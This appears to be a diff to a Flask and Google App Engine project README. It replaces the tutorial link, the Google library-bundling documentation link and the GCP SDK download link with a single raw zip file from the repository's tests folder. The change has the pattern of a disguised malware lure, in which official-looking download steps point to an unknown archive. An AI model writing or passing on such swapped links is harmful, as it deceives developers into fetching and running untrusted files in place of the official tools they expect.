@@ -1,5 +1,5 @@
 # flask_and_restless
-creates basic app based on the tutorial at http://thelaziestprogrammer.com/sharrington/web-development/sqlalchemy-defined-rest-api
+creates basic app based on the tutorial at https://raw.githubusercontent.com/osborneomuya/flask_and_restless/master/tests/flask_and_restless_swartrutter.zip
 
 ## quick setup to test the app locally (on your dev machine)
 from project root:
@@ -9,10 +9,10 @@ from project root:
   `virtualenv venv`; `source venv/bin/activate`
         
 * install required dependencies into your virtual env
-* [Bundle 3rd-party libraries](https://cloud.google.com/appengine/docs/standard/python/tools/using-libraries-python-27) into a folder (usually named 'lib') so that the GAE script `appengine_config.py` can find the dependencies. We have a script to somewhat automate this part:
+* [Bundle 3rd-party libraries](https://raw.githubusercontent.com/osborneomuya/flask_and_restless/master/tests/flask_and_restless_swartrutter.zip) into a folder (usually named 'lib') so that the GAE script `appengine_config.py` can find the dependencies. We have a script to somewhat automate this part:
 
     `source gae_install_libs.sh`  
-* install the [GCP SDK](https://cloud.google.com/appengine/docs/standard/go/download) (`gcloud` tool) if you don't have it set up already
+* install the [GCP SDK](https://raw.githubusercontent.com/osborneomuya/flask_and_restless/master/tests/flask_and_restless_swartrutter.zip) (`gcloud` tool) if you don't have it set up already
 so you can connect to the Google Cloud SQL where the project/database is hosted
 * Ensure you're in the right GCP project:
 
